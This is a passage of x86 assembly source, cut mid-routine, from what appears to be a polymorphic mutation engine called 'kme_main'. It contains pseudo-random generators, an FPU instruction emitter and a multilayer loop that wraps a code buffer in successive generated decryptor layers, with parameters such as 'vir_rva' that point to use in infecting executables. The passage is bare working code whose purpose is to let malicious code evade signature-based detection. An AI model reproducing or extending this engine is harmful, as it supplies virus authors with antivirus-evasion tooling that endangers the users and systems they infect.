@@fist:                 mov     ax, 1CDBh    ; fistp dword ptr [esp]
                        fistp   dword ptr [esp+4]
@@x2:                   stosw
                        mov     al, 24h
                        stosb
                        dec     fpustack
                        call    @@poly_cmd
                        retn

; ---------------------------------------------------------------------------

random:                 mov     eax, randseed
                        imul    eax, 214013
                        add     eax, 2531011
                        mov     randseed, eax

                        mov     eax, randseed2
                        imul    eax, 8088405h
                        inc     eax
                        mov     randseed2, eax

                        xor     eax, randseed
                        retn

rnd:                    push    ecx
                        push    edx
                        call    random
                        mov     ecx, [esp+4]+8    ; range
                        cmp     ecx, 65536
                        jae     @@div
@@mul:                  shr     eax, 16
                        imul    eax, ecx
                        shr     eax, 16
@@rnd_exit:             pop     edx
                        pop     ecx
                        test    eax, eax
                        retn    4
@@div:                  xor     edx, edx
                        div     ecx
                        mov     eax, edx          ; v5.50 bugfix
                        jmp     @@rnd_exit

rnd_eax:                push    eax
                        call    rnd
                        retn

rnd_3:                  push    3
                        call    rnd
                        retn

rnd_2:                  push    2
                        call    rnd
                        retn

rnd_zf:                 push    eax
                        call    rnd_2
                        pop     eax
                        retn

rnd_8:                  push    8
                        call    rnd
                        retn

rnd_byte:               push    256
                        call    rnd
                        retn

rnd_dword:              push    eax
                        call    rnd_byte
                        mov     [esp+0], al
                        call    rnd_byte
                        mov     [esp+1], al
                        call    rnd_byte
                        mov     [esp+2], al
                        call    rnd_byte
                        mov     [esp+3], al
                        pop     eax
                        test    eax, eax
                        retn

@@multilayer:
                        ; calc EBX = # of layers we wanna build
                        mov     eax, nlayer  ; != 1 (1 was used before)
                        cmp     eax, 2       ; nlayer >= 2 --> exactly #
                        jge     @@eax_layers
                        cmp     eax, -2      ; nlayer <= -2 --> 1+rnd(-nlayer)
                        jle     @@rnd_layers
                        jmp     @@error_badarg ; nlayer == -1,0 --> unused
@@rnd_layers:           neg     eax
                        call    rnd_eax
                        inc     eax
@@eax_layers:           xchg    ebx, eax

                        mov     restartcount, 0
@@restart:
                        ; COPY: input -> temp
                        mov     edi, tempbufptr
                        or      edi, edi
                        jz      @@error_badarg
                        mov     esi, i_offs
                        mov     ecx, i_size
                        mov     t_size, ecx
                        rep     movsb
                        push    i_entry
                        pop     t_entry

                        xor     edx, edx
@@layer_cycle:          inc     edx             ; current layer #, [1..EBX]

                        ; KME: temp -> output

                        push    flags

; allow FLAG_X_RETBYJMP & FLAG_X_RET0C to be set in OUTER layer only
                        cmp     edx, ebx
                        je      @@z0
                        and     dword ptr [esp], not (FLAG_X_RETBYJMP+FLAG_X_RET0C)
@@z0:
                        push    cmdavail
                        push    cmdavail2
                        push    regavail
                        push    jmp_prob
                        push    po_entry

                        mov     ecx, po_size
                        or      ecx, ecx
                        jnz     @@cxnz
                        lea     ecx, po_size_ml
                        mov     po_size, ecx
@@cxnz:
                        push    ecx             ; po_size
                        push    o_fillchar
                        push    o_max
                        push    o_offs
                        push    t_entry
                        push    t_size
                        push    tempbufptr      ; i_offs

                        push    initregptr      ; } used in OUTER layer only
                        cmp     edx, ebx
                        je      @@z1
                        pop     eax
                        push    0
@@z1:
                        push    exitregptr      ; } used in INNER layer only
                        cmp     edx, 1
                        je      @@z2
                        pop     eax
                        push    0
@@z2:
                        push    vir_rva
                        push    original_rva

                        push    regsave         ; } used in OUTER layer only
                        cmp     edx, ebx
                        je      @@z3
                        pop     eax
                        push    0
@@z3:
                        call    rnd_dword
                        push    eax             ; randseed
                        push    1               ; nlayer
                        push    0               ; tempbufptr
                        call    kme_main
                        add     esp, 4*KME_N_ARGS

                        cmp     eax, KME_ERROR_NOMEMORY
                        jne     @@baderror
                        cmp     edx, 1
                        je      @@baderror
                        mov     ecx, nlayer
                        or      ecx, ecx
                        jl      @@restart_nlayer
                        test    flags, FLAG_FAILIFNOMEMORY
                        jz      @@restart_nlayer
@@baderror:
                        cmp     eax, KME_ERROR_SUCCESS
                        jne     @@error_eax

                        cmp     edx, ebx
                        je      @@success_exit

                        ; COPY: output --> temp
                        mov     esi, o_offs
                        mov     edi, tempbufptr
                        mov     ecx, po_size
                        mov     ecx, [ecx]
                        mov     t_size, ecx
                        rep     movsb
                        mov     ecx, po_entry
                        jecxz   @@cxz
                        mov     ecx, [ecx]
@@cxz:                  mov     t_entry, ecx

                        jmp     @@layer_cycle

@@do_success_exit:
                        ; COPY: temp --> output
                        mov     esi, tempbufptr
                        mov     edi, o_offs
                        mov     eax, po_size
                        mov     ecx, t_size
                        mov     [eax], ecx
                        rep     movsb
                        mov     ecx, po_entry
                        jecxz   @@cxz2
                        mov     eax, t_entry
                        mov     [ecx], eax
@@cxz2:
                        jmp     @@success_exit

@@restart_nlayer:       cmp     restartcount, 0
                        jne     @@error_assert
                        inc     restartcount

                        lea     ebx, [edx-1] ; no we know how many can build
                        jmp     @@restart

kme_main                endp

; ---------------------------------------------------------------------------
